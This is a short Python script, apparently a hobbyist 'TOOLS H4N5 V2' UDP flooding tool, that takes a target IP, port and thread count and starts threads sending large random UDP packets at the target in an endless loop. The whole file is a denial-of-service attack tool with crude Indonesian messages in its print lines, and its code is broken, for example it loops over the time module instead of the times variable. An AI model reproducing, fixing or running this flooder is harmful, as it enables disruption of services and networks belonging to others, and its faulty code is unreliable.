import socket
import random
import threading
import time
import os , sys

print ("TOOLS H4N5 V2")
print ("DONT ABUSE BROTHER!!")

ip = str(input(" Ip :"))
port = int(input(" Port :"))
choice = str(input(" UDP?? y/n :"))
times = int(input(" Times :"))
threads = int(input(" Threads :"))
os.system("clear")
def udp():
	data = random._urandom(65503)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(time):
				s.sendto(data,addr)
			print(+"\033[91m  Mengentod %s \\033[91m Dan memberi peju %s"%(ip,port))
		except:
			print("ATTACK TO %s PORT %s"%(ip,port))

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = udp)

        th.start()